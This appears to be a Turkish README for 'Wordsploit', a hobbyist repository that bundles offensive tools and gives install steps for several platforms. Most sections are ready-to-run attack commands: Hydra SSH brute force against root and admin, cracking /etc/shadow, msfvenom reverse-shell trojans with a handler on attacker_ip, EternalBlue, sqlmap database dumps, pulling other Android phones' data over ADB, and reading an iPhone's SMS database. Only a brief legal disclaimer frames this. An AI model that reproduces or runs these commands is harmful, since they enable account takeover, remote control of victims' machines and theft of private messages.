# 🛠️ Wordsploit - İlk İşletim Sistemim

![BTK Academy - Sibel Güvenlik A.Ş](assets/btk-academy-banner.svg)

> TT Sywox TX 🇩🇪/
> 
> **HER PLATFORMDA ÇALIŞIR** 🚀
> - 📱 Termux (Android)
> - 🪟 Windows
> - 🐧 Kali Linux
> - 🐱 BlackTrack 5
> - 🍎 macOS
> - 📡 Raspberry Pi
> - 🐳 Docker

![Language Composition](https://img.shields.io/badge/C%2B%2B-52.4%25-blue?style=flat-square)
![Language Composition](https://img.shields.io/badge/Python-19.1%25-green?style=flat-square)
![Language Composition](https://img.shields.io/badge/Shell-15.6%25-red?style=flat-square)
![Language Composition](https://img.shields.io/badge/Platforms-Multi-orange?style=flat-square)

---

## 📋 Hızlı Platform Seçimi

| 🎯 **Platform** | 📖 **Kurulum** | 🔗 **Link** |
|---|---|---|
| **📱 Termux** | Android telefonunuzda | [Termux Kurulum](#-termux-android-kurulum) |
| **🪟 Windows** | Windows 10/11 | [Windows Kurulum](#-windows-kurulum) |
| **🐧 Kali Linux** | Kali Linux özel | [Kali Linux Kurulum](#-kali-linux-kurulum) |
| **🐱 BackTrack 5** | Eski ama güçlü | [BlackTrack 5 Kurulum](#-blacktrack-5-kurulum) |
| **🐳 Docker** | Tüm platformlar | [Docker Kurulum](#-docker-kurulum) |
| **🍎 macOS** | Mac bilgisayarlar | [macOS Kurulum](#-macos-kurulum) |
| **🥧 Raspberry Pi** | Embedded Linux | [Raspberry Pi](#-raspberry-pi-kurulum) |

---

## 📱 TERMUX (ANDROID) KURULUM

### Termux Nedir?
Termux, Android telefonunuzda terminal ve Linux ortamı sağlayan uygulamadır.

### Step 1: Termux Yükleyin
```bash
# Google Play Store'dan veya F-Droid'den yükleyin
# F-Droid (Ücretsiz): https://f-droid.org/repo/com.termux/
# Play Store: https://play.google.com/store/apps/details?id=com.termux
```

### Step 2: Termux'ta İlk Kurulum
```bash
# Paketleri güncelle
pkg update && pkg upgrade -y

# Temel araçları yükle
pkg install -y git python python-pip clang build-essential

# Storage erişimi
termux-setup-storage

# Home dizinine git
cd ~
```

### Step 3: Wordsploit Yükle
```bash
# Repoyu klonla
git clone https://github.com/memetcanwq31-ship-it/https-github.com-wordsploit.git
cd https-github.com-wordsploit

# Kurulum
chmod +x install.sh
bash install.sh

# Termux özel kurulum
pkg install -y hydra john hashcat metasploit nmap
```

### Termux'ta Brute Force
```bash
# Hydra SSH
hydra -l root -P rockyou.txt ssh://target.com

# Hashcat (CPU - GPU yok)
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt hashes.txt
```

### Termux'ta Flipper Zero
```bash
# Flipper Zero emülasyonu
pkg install -y qemu
# Flipper firmware yükle ve emüle et
```

### Termux'ta Data Force (Telefon Bilgisi)
```bash
# Kendi telefonun bilgisini al
getprop ro.serialno
getprop ro.build.fingerprint
getprop ro.telephony.default_network

# Başka Android'e ADB ile
pkg install -y android-tools
adb connect target_ip:5555
adb shell getprop
adb pull /data/data/
```

### Termux'ta RAT Sunucu
```bash
# Python RAT server
python -m http.server 8000

# Netcat listener
nc -lvnp 4444

# Meterpreter handler
python -c "import socket; s=socket.socket(); s.bind(('0.0.0.0',4444)); s.listen()"
```

### Termux Sorunları & Çözümleri
```bash
# "Izin Yok" hatası
termux-setup-storage
chmod -R 700 $HOME

# Python modülü yok
pip install --upgrade pip
pip install pycryptodome requests paramiko

# Bellek yetersiz
# /data/data/com.termux/files/home/.bashrc içine ekle:
export CFLAGS="-Os"
```

### Termux'ta Sık Komutlar
```bash
# Sistem bilgisi
uname -a
cat /proc/cpuinfo

# Ağ bilgisi
ifconfig
netstat -an

# Dosya yönetimi
ls -la
cat /data/local/tmp/

# İşlem yönetimi
ps aux
kill -9 [PID]
```

---

## 🪟 WINDOWS KURULUM

### Seçenek 1: Native Windows (En Basit)
```batch
# Admin olarak Command Prompt aç
# Windows Key + R → cmd → Ctrl+Shift+Enter

# Repoyu indir (veya git kullan)
git clone https://github.com/memetcanwq31-ship-it/https-github.com-wordsploit.git
cd https-github.com-wordsploit

# Kurulum çalıştır
install.bat
```

### Seçenek 2: Windows Subsystem for Linux (WSL)
```bash
# PowerShell'de Admin olarak aç
wsl --install

# WSL içinde Kurulum
./install.sh
```

### Seçenek 3: Chocolatey Paket Yöneticisi
```bash
# Chocolatey yükle
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.We[...] 

# Araçları yükle
choco install python git cmake -y
choco install hydra nmap metasploit -y
```

### Windows'ta Brute Force (CMD)
```batch
# Hydra
hydra -l admin -P wordlist.txt ssh://target.com

# Hashcat
hashcat.exe -m 0 -a 0 hashes.txt wordlist.txt

# John the Ripper
john.exe --wordlist=wordlist.txt hashes.txt
```

### Windows'ta RAT Meterpreter
```batch
# Payload oluştur
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > trojan.exe

# Handler başlat (cmd'de)
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit
```

### Windows PowerShell Komutları
```powershell
# Sistem bilgisi
Get-ComputerInfo

# Ağ bilgisi
ipconfig /all
netstat -ano

# Dosya yönetimi
Get-ChildItem -Path C:\
Get-Content C:\Windows\System32\drivers\etc\hosts

# İşlem yönetimi
Get-Process
Stop-Process -Name explorer -Force
```

### Windows'ta Python Kurulum
```batch
# Python indir
python -m pip install --upgrade pip

# Araç kurma
pip install paramiko pycryptodome requests sqlalchemy
```

---

## 🐧 KALI LINUX KURULUM

### Step 1: Kali Linux Yükle
```bash
# İndirin: https://www.kali.org/get-kali/

# ISO'dan boot et
# Kurulum yapın

# Kurulumdan sonra:
sudo apt update && sudo apt upgrade -y
```

### Step 2: Wordsploit Kurulum
```bash
# Repoyu klonla
git clone https://github.com/memetcanwq31-ship-it/https-github.com-wordsploit.git
cd https-github.com-wordsploit

# Kurulum
sudo chmod +x install.sh
sudo bash install.sh
```

### Kali Linux'ta Önceden Yüklü Araçlar
```bash
# Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com

# John the Ripper
john /etc/shadow --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue

# Burp Suite
burpsuite &

# Wireshark
sudo wireshark &

# SQLMap
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

---

## 🐱 BLACKTRACK 5 KURULUM

### BlackTrack 5 Nedir?
BlackTrack 5, Backtack'in son sürümü. 2012'den sonra Kali Linux oldu. Ancak 64-bit sistem için eski.

### Step 1: BlackTrack 5 Kurulum
```bash
# ISO'dan önyükleme
# Kurulum işlemleri

# Sistem güncelleme (eski, çoğu depo açık değil)
apt-get update
apt-get upgrade
```

### Step 2: Wordsploit Kurulum
```bash
# Git klonlama (eski sürüm)
apt-get install -y git
git clone https://github.com/memetcanwq31-ship-it/https-github.com-wordsploit.git
cd https-github.com-wordsploit

# Kurulum (bazı bağımlılıklar bulunamayabilir)
chmod +x install.sh
bash install.sh
```

### BlackTrack 5'te Araçlar
```bash
# Önceden yüklü (Backtrack özel)
aircrack-ng              # Wireless
wireshark                # Sniffer
metasploit               # Exploit
nmap                     # Scanner
hashcat (eski versiyon)  # Hash cracking
sqlmap                   # SQL injection
```

### BlackTrack 5 Sorunları & Çözümler
```bash
# Eski depo hatası
# /etc/apt/sources.list düzenle
deb http://archive.ubuntu.com/ubuntu lucid main universe

# Python 2.7 ile uyumluluk
python --version
python2.7 script.py

# Kernel sorunları
uname -r
# Güncelleme mümkün olmayabilir
```

### BackTrack 5'te Pentesting Araçları
```bash
# Başlatıcı menü
Applications > BackTrack > Exploitation Tools > Metasploit
Applications > BackTrack > Sniffing & Spoofing > Wireshark
Applications > BackTrack > Wireless Tools > Aircrack-ng
```

---

## 🐳 DOCKER KURULUM (TÜM PLATFORMLAR)

### Docker Nedir?
Docker, uygulamayı containerize eder. Tüm platformlarda aynı şekilde çalışır.

### Step 1: Docker Yükle
```bash
# Linux
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# Windows (Docker Desktop)
# https://www.docker.com/products/docker-desktop

# macOS (Homebrew)
brew install docker
```

### Step 2: Wordsploit Dockerfile
```dockerfile
FROM ubuntu:22.04

# Araçları yükle
RUN apt-get update && apt-get install -y \
    git python3 python3-pip \
    hydra john hashcat nmap metasploit-framework \
    sqlmap wireshark burpsuite \
    && rm -rf /var/lib/apt/lists/*

# Wordsploit klonla
RUN git clone https://github.com/memetcanwq31-ship-it/https-github.com-wordsploit.git /wordsploit
WORKDIR /wordsploit

# Python bağımlılıkları
RUN pip3 install -r requirements.txt 2>/dev/null || true

# Başlangıç komutu
CMD ["/bin/bash"]
```

### Step 3: Docker Çalıştır
```bash
# İmaj oluştur
docker build -t wordsploit .

# Konteyner başlat
docker run -it wordsploit bash

# Brute force çalıştır
docker run -it wordsploit hydra -l admin -P rockyou.txt ssh://target.com

# Meterpreter handler
docker run -it -p 4444:4444 wordsploit msfconsole
```

### Docker Compose (Gelişmiş)
```yaml
version: '3'
services:
  wordsploit:
    image: wordsploit:latest
    container_name: wordsploit-main
    volumes:
      - ./data:/worksploit/data
      - ./wordlists:/wordlists
    ports:
      - "4444:4444"
      - "8000:8000"
    networks:
      - pentesting
    environment:
      - TARGET_IP=192.168.1.100
    
  listener:
    image: wordsploit:latest
    container_name: meterpreter-listener
    ports:
      - "4444:4444"
    command: msfconsole
    networks:
      - pentesting

networks:
  pentesting:
    driver: bridge
```

---

## 🍎 MACOS KURULUM

### Step 1: Homebrew Yükle
```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

### Step 2: Araçları Yükle
```bash
# Güncelleştir
brew update && brew upgrade

# Temel araçlar
brew install git python3 cmake llvm

# Pentesting araçları
brew install hydra hashcat john nmap metasploit

# Gelişmiş araçlar
brew install wireshark burpsuite sqlmap
```

### Step 3: Wordsploit Kurulum
```bash
git clone https://github.com/memetcanwq31-ship-it/https-github.com-wordsploit.git
cd https-github.com-wordsploit
chmod +x install.sh
./install.sh
```

### macOS'ta Brute Force
```bash
# Hydra
hydra -l admin -P wordlist.txt ssh://target.com

# Hashcat (Metal GPU hızlandırma)
hashcat -m 0 -a 0 hashes.txt wordlist.txt -O

# John
john --wordlist=wordlist.txt hashes.txt
```

---

## 🥧 RASPBERRY PI KURULUM

### Step 1: Raspberry Pi OS Yükle
```bash
# Raspberry Pi Imager'ı kullan
# https://www.raspberrypi.com/software/

# Debian Bullseye (32-bit) veya Ubuntu (64-bit)
```

### Step 2: İlk Kuruluş
```bash
# SSH aç
sudo raspi-config
# Interfacing Options → SSH → Enable

# Güncelleştir
sudo apt update && sudo apt upgrade -y
```

### Step 3: Wordsploit Kurulum
```bash
git clone https://github.com/memetcanwq31-ship-it/https-github.com-wordsploit.git
cd https-github.com-wordsploit

# Kurulum
sudo chmod +x install.sh
sudo bash install.sh
```

### Raspberry Pi'de Lightweight Tools
```bash
# Pi için optimize edilmiş araçlar
sudo apt install -y python3-pip hydra nmap john

# Hafif brute force
hydra -l pi -P rockyou.txt ssh://192.168.1.10

# Sistem monitörü
vcgencmd measure_temp          # Sıcaklık
vcgencmd get_mem reloc         # Bellek
```

---

## 📱 FLIPPER ZERO (TÜM PLATFORMLAR)

### Windows'ta Flipper Zero Kurulum
```batch
# Firmware indir
# https://github.com/flipperdevices/flipperzero-firmware/releases

# Emülator
set PATH=%PATH%;C:\Program Files\Flipper Zero\

# CLI Komutlar
flipper_cli.exe --device-com-port COM3 --file firmware.bin
```

### Linux'ta Flipper Zero
```bash
# Firmware derleme
git clone https://github.com/flipperdevices/flipperzero-firmware.git
cd flipperzero-firmware

# Build
make

# Flashing
make flash

# RFID oku
fzf-cli --rfid-read
```

### Termux'ta Flipper Zero Emülasyonu
```bash
# Basit RFID emülasyonu
pkg install -y qemu
# Flipper emüle et
```

---

## 💪 BRUTE FORCE (TÜM PLATFORMLAR)

### Hydra (Tüm Platformlar)
```bash
# Linux/macOS/Kali
hydra -l admin -P wordlist.txt ssh://target.com

# Windows
hydra.exe -l admin -P wordlist.txt ssh://target.com

# Termux
hydra -l admin -P rockyou.txt ssh://target.com

# Docker
docker run -it wordsploit hydra -l admin -P rockyou.txt ssh://target.com
```

### Hashcat (GPU)
```bash
# Linux/macOS
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Windows
hashcat.exe -m 0 -a 0 hashes.txt wordlist.txt

# Docker (CPU)
docker run -it wordsploit hashcat -m 0 -a 0 hashes.txt wordlist.txt
```

---

## 💾 DATA FORCE (TÜM PLATFORMLAR)

### Telefon Verisi Çıkarma
```bash
# Android (tüm platformlar)
adb connect 192.168.1.100:5555
adb shell getprop ro.serialno
adb pull /data/data/

# iOS (macOS/Linux)
ssh -l root target_iphone_ip
cat /var/mobile/Library/SMS/sms.db
```

### SQLMap (Tüm Platformlar)
```bash
# Linux/macOS/Termux
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Windows
python sqlmap.py -u "http://target.com/page.php?id=1" --dbs

# Docker
docker run -it wordsploit sqlmap -u "http://target.com/page.php?id=1" --dbs
```

---

## ☠️ RAT (TÜM PLATFORMLAR)

### Meterpreter (Evrensel)
```bash
# Payload oluştur (Linux/macOS)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf

# Handler (tüm platformlar)
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit

# Docker'da
docker run -it -p 4444:4444 wordsploit msfconsole
```

---

## 📋 Platform Karşılaştırması

| Özellik | Termux | Windows | Kali | BlackTrack 5 | Docker |
|---------|--------|---------|------|-------------|--------|
| **Kurulum Kolaylığı** | ⭐⭐⭐ | ⭐⭐ | ⭐⭐ | ⭐ | ⭐⭐⭐⭐ |
| **Performans** | ⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐ |
| **Uyumlu Araçlar** | ⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ |
| **GPU Support** | ❌ | ✅ | ✅ | ❌ | ⚠️ |
| **Taşınabilirlik** | ✅ | ❌ | ❌ | ❌ | ✅ |
| **İlk Kurulum Süresi** | 5 min | 30 min | 1 saat | 1+ saat | 10 min |

---

## 🚀 Hızlı Başlama Rehberi

### Hangi Platformu Seçmeliyim?

```
📱 TERMUX → Telefonda brute force, hakim veri
🪟 WINDOWS → Masaüstü, Meterpreter RAT
🐧 KALI LINUX → Profesyonel penetrasyon testi
🐳 DOCKER → Hızlı, taşınabilir, temiz
```

### 5 Dakikada Kurulum

**Termux:**
```bash
pkg update && pkg install -y git hydra
git clone https://github.com/memetcanwq31-ship-it/https-github.com-wordsploit.git
hydra -l admin -P rockyou.txt ssh://target.com
```

**Windows:**
```batch
git clone https://github.com/memetcanwq31-ship-it/https-github.com-wordsploit.git
cd https-github.com-wordsploit
install.bat
```

**Kali:**
```bash
git clone https://github.com/memetcanwq31-ship-it/https-github.com-wordsploit.git
sudo bash install.sh
```

**Docker:**
```bash
docker build -t wordsploit .
docker run -it wordsploit bash
```

---

## 📚 Tüm Belgeler

- **README.md** (Bu dosya) - Ana belge
- **MENU.md** - İnteraktif menü ve hızlı komutlar
- **HACK_TOOLS.md** - 20+ araç
- **KALI_TOOLS.md** - Kali spesifik
- **TOOLS_INSTALLATION.md** - Kurulum rehberi
- **TOOLS_CHEATSHEET.md** - Komut örnekleri
- **DOCKER-SETUP.md** - Docker yapılandırma

---

## ⚠️ Yasal Uyarı

Bu araçlar **yasal penetrasyon testleri** için hazırlanmıştır.
- ✅ İzin alınmış sistemlerde test
- ✅ Kendi sistemlerinizi koruma
- ❌ İzinsiz erişim **YASAL DEĞİLDİR**

---

## 💬 Destek

- **Sorun?** Issues açın
- **Soru?** Dokumentasyon okuyun
- **Öneri?** PR gönderin

---

**🎉 Kurulum Tamamlandı! Şimdi Kullanabilirsiniz!**

*Millet İstediğini Seçebilsin, Sonuçta Çok Araç ve Tool Var 🤗*

*Last Updated: 2026-07-13*
